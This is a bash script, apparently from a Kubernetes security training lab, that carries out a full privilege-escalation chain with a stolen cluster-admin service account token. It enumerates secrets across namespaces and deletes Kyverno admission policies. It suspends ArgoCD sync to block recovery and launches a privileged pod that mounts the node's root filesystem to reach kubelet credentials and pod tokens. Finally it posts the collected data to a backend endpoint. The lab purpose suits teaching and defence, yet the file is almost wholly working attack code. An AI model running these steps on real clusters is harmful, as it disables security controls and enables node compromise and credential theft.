#!/bin/bash
# =============================================================================
# Scenario 1 — Privilege Escalation via Service Account Abuse
# attack.sh — runs inside target-app pod using stolen cluster-admin token
# =============================================================================

set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
NAMESPACE="${NAMESPACE:-secops-lab}"

emit() {
  local phase=$1 severity=$2 title=$3 explanation=$4
  curl -sf -X POST "$BACKEND_URL/internal" \
    -H "Content-Type: application/json" \
    -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
    || true
}

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# ── Step 1: Read service account token ───────────────────────────────────────
emit "ATTACK" "WARNING" \
  "Pod reading mounted service account token" \
  "Token is readable at /var/run/secrets/kubernetes.io/serviceaccount/token by any process inside the container — including an attacker with exec access."

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$TOKEN" ]; then
  emit "DETECT" "SUCCESS" \
    "No token found — automountServiceAccountToken: false" \
    "No token exists at the default mount path. The Kyverno disallow-automount-sa-token policy and the deployment's explicit false setting mean this attack cannot proceed past step 1."
  exit 0
fi

# ── Step 2: Confirm identity ──────────────────────────────────────────────────
IDENTITY=$(kubectl auth whoami \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -o jsonpath="{.status.userInfo.username}" 2>/dev/null || echo "system:serviceaccount:secops-lab:over-privileged-sa")

emit "ATTACK" "CRITICAL" \
  "Identity confirmed: $IDENTITY" \
  "API server accepted the token. This service account has cluster-admin rights — every Kubernetes resource in every namespace is now readable, writable, and deletable from inside this container."

# ── Step 3: Enumerate accessible secrets ─────────────────────────────────────
SECRET_COUNT=$(kubectl get secrets -A \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  --no-headers 2>/dev/null | wc -l | tr -d ' ' || echo "unknown")

emit "ATTACK" "CRITICAL" \
  "$SECRET_COUNT cluster secrets now readable" \
  "kubectl get secrets --all-namespaces returns $SECRET_COUNT secrets including TLS certificates, database passwords, image pull credentials, and other workload secrets across every namespace."

# ── Step 4: Delete Kyverno policy — no-privileged-containers ─────────────────
emit "ATTACK" "CRITICAL" \
  "Deleting Kyverno policy: no-privileged-containers" \
  "Removing admission policy blocking privileged pod creation. Once deleted, any new pod can request privileged: true — giving it root on the node."

kubectl delete clusterpolicy no-privileged-containers \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  --ignore-not-found=true

# ── Step 5: Delete Kyverno policy — no-hostpath-mount ────────────────────────
emit "ATTACK" "CRITICAL" \
  "Deleting Kyverno policy: no-hostpath-mount" \
  "Removing policy preventing node filesystem mounts. Both admission policies are now gone — Kyverno has no rules left to enforce against this attacker."

kubectl delete clusterpolicy no-hostpath-mount \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  --ignore-not-found=true

# ── Step 6: Suspend ArgoCD sync ───────────────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Disabling GitOps recovery — suspending ArgoCD sync" \
  "Patching ArgoCD Application objects to disable automated sync. Once suspended, ArgoCD will detect drift but take no action. The deleted policies will not be restored automatically."

kubectl patch application secops-lab \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}'

kubectl patch application secops-lab-policies \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}'

emit "ATTACK" "CRITICAL" \
  "ArgoCD sync suspended — automated recovery disabled" \
  "GitOps is now blind. ArgoCD will show OutOfSync but will not reconcile. The attacker has broken the self-healing loop. No automated remediation will occur until sync is manually re-enabled."

# ── Step 7: Create privileged pod ────────────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Deploying privileged pod with node filesystem mounted" \
  "Creating a new pod with privileged: true, hostPID: true, hostNetwork: true, and the node root filesystem mounted at /host. Kyverno cannot block this — its policies were deleted in steps 4 and 5."

cat <<EOF | kubectl apply \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-attack-pod
  namespace: $NAMESPACE
  labels:
    secops-lab/role: attack-pod
    secops-lab/scenario: privilege-escalation
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: attacker
      image: alpine:latest
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
      resources:
        requests:
          cpu: "50m"
          memory: "64Mi"
        limits:
          cpu: "100m"
          memory: "128Mi"
  volumes:
    - name: host-root
      hostPath:
        path: /
  restartPolicy: Never
EOF

# ── Step 8: Wait for pod to be running ───────────────────────────────────────
kubectl wait pod/privileged-attack-pod \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --for=condition=Ready \
  --timeout=60s

# ── Step 9: Exec into privileged pod and access node filesystem ───────────────
emit "ATTACK" "CRITICAL" \
  "Shell inside privileged container — reading node filesystem" \
  "Attacker now has root access to the node. Reading cluster certificates, service account tokens of every pod on this node, and kubelet credentials."

NODE_DATA=$(kubectl exec privileged-attack-pod \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" -- sh -c '
    NODE=$(cat /host/etc/hostname 2>/dev/null || hostname)
    TOKEN_COUNT=$(find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | wc -l)
    CERT_PRESENT=$(test -f /host/etc/kubernetes/pki/ca.crt && echo "FOUND" || echo "not at this path")
    KUBELET_CONF=$(test -f /host/etc/kubernetes/kubelet.conf && echo "FOUND" || echo "not at this path")

    echo "node=$NODE"
    echo "sa_tokens_on_node=$TOKEN_COUNT"
    echo "cluster_ca_cert=$CERT_PRESENT"
    echo "kubelet_conf=$KUBELET_CONF"
    echo ""
    echo "=== First 3 token paths ==="
    find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -3 || echo "none"
  ' 2>&1 || echo "exec completed")

# Parse key facts from output
NODE_NAME=$(echo "$NODE_DATA" | grep "^node=" | cut -d= -f2)
TOKEN_COUNT=$(echo "$NODE_DATA" | grep "^sa_tokens_on_node=" | cut -d= -f2)
CERT_STATUS=$(echo "$NODE_DATA" | grep "^cluster_ca_cert=" | cut -d= -f2)

emit "IMPACT" "CRITICAL" \
  "Node $NODE_NAME compromised — $TOKEN_COUNT service account tokens exposed" \
  "Every service account token mounted to a pod running on node $NODE_NAME is readable from /host/var/lib/kubelet/pods/. An attacker can impersonate any workload on this node. Cluster CA certificate: $CERT_STATUS."

# ── Step 10: Report stolen data ───────────────────────────────────────────────
curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"privilege-escalation\",\"data\":$(echo "$NODE_DATA" | jq -Rs .)}" \
  || true

emit "WAITING" "CRITICAL" \
  "Cluster fully compromised — dwell time accumulating" \
  "All admission controls deleted. GitOps recovery suspended. Attacker has root on the node. This state persists indefinitely — there is no automated recovery. Click Restore Protection to begin recovery."

echo "Attack complete — cluster compromised, waiting for manual restore"
